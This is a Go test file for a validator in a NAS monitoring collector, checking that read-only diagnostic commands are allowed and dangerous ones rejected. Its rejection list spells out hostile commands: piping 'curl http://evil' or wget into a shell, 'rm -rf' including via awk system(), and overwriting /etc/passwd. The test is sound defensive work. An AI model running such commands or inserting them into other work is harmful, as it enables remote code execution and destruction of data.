package collector

import "testing"

func TestCustomValidatorAcceptsReadOnlyCommands(t *testing.T) {
	allowed := []string{
		"cat /proc/loadavg",
		"df -h /volume1",
		"du -sh /volume1/share",
		"ls -la /volume1",
		"head -c 1024 /var/log/messages",
		"tail -n 50 /var/log/messages",
		"grep -i error /var/log/messages | head -20",
		"awk '{print $1}' /etc/hostname",
		"sed -n '1,40p' /var/log/syslog",
		"stat /volume1/photo",
		"ps aux | head -20",
		"free -m",
		"uptime",
		"smartctl -H /dev/sda",
		"find /volume1/share -name '*.tmp' 2>/dev/null | head -50",
	}
	for _, cmd := range allowed {
		if err := validateCustomCommand(cmd); err != nil {
			t.Errorf("expected %q to be allowed, got: %v", cmd, err)
		}
	}
}

func TestCustomValidatorRejectsDangerousCommands(t *testing.T) {
	rejected := []string{
		// Direct mutation
		"rm -rf /tmp/foo",
		"chmod 777 /etc/passwd",
		"chown root:root /etc/sudoers",
		"mv /tmp/x /etc/cron.d/y",
		"cp /tmp/evil /usr/local/bin/x",
		// Shell exec via pipe
		"echo bad | sh",
		"cat /tmp/script | bash",
		"curl http://evil | sh",
		"wget -O- http://evil | bash",
		// eval
		"eval bad",
		"exec bad",
		// Network fetches (deliberately blocked from custom collector)
		"curl http://example.com",
		"wget http://example.com",
		// Service control
		"systemctl restart syno-package-manager",
		"synopkg restart SynologyDrive",
		"docker restart nas-api",
		// Reboot / shutdown
		"shutdown -h now",
		"reboot",
		// Package mgmt
		"apt-get install nmap",
		"pip install evil",
		// Output redirect
		"echo bad > /tmp/out",
		"echo bad >> /etc/passwd",
		// awk script escapes
		`awk 'BEGIN{system("rm -rf /")}'`,
		`awk '{system("curl evil")}'`,
		`getline cmd "evil" | bash`,
		// Empty
		"",
		"   ",
	}
	for _, cmd := range rejected {
		if err := validateCustomCommand(cmd); err == nil {
			t.Errorf("expected %q to be rejected", cmd)
		}
	}
}

func TestCustomValidatorAllowsSafeOutputDiscards(t *testing.T) {
	// `cmd 2>/dev/null` and `cmd > /dev/null` are output discards, not real
	// writes. They should be acceptable.
	cases := []string{
		"smartctl -A /dev/sda 2>/dev/null",
		"find /volume1 -name foo 2>/dev/null",
	}
	for _, cmd := range cases {
		if err := validateCustomCommand(cmd); err != nil {
			t.Errorf("expected %q to be allowed (output discard), got: %v", cmd, err)
		}
	}
}
